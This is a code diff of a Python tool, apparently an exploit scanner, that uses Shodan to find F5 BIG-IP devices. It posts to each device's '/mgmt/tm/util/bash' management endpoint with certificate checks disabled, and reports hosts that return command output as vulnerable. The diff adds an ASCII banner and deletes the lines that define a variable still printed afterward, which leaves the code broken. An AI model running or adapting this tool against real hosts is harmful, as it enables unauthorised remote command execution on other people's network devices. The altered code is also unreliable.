@@ -4,6 +4,17 @@ import requests
 import json
 import urllib3
 
+"""
+
+███████╗ ██╗██╗   ██╗██████╗     ███████╗ ██████╗██╗  ██╗███╗   ██╗
+██╔════╝███║██║   ██║╚════██╗    ██╔════╝██╔════╝██║  ██║████╗  ██║
+█████╗  ╚██║██║   ██║ █████╔╝    ███████╗██║     ███████║██╔██╗ ██║
+██╔══╝   ██║╚██╗ ██╔╝ ╚═══██╗    ╚════██║██║     ╚════██║██║╚██╗██║
+██║      ██║ ╚████╔╝ ██████╔╝    ███████║╚██████╗     ██║██║ ╚████║
+╚═╝      ╚═╝  ╚═══╝  ╚═════╝     ╚══════╝ ╚═════╝     ╚═╝╚═╝  ╚═══╝
+                                                                   by c0deninja
+
+"""
 
 SHODAN_API_KEY = ""
 api = shodan.Shodan(SHODAN_API_KEY)
@@ -30,8 +41,6 @@ try:
             try:
                 response = requests.post(url=f"https://{f5_list}/mgmt/tm/util/bash", json=data, headers=headers, verify=False, timeout=5)
                 if response.status_code == 200 and 'commandResult' in response.text:
-                    default = json.loads(response.text)
-                    display = default['commandResult']
                     print(f"{Fore.GREEN}VULNERABLE: {Fore.CYAN}https://{f5_list}")
                     print(f"{Fore.GREEN}RESULTS: {Fore.CYAN}{display}")
                 else:
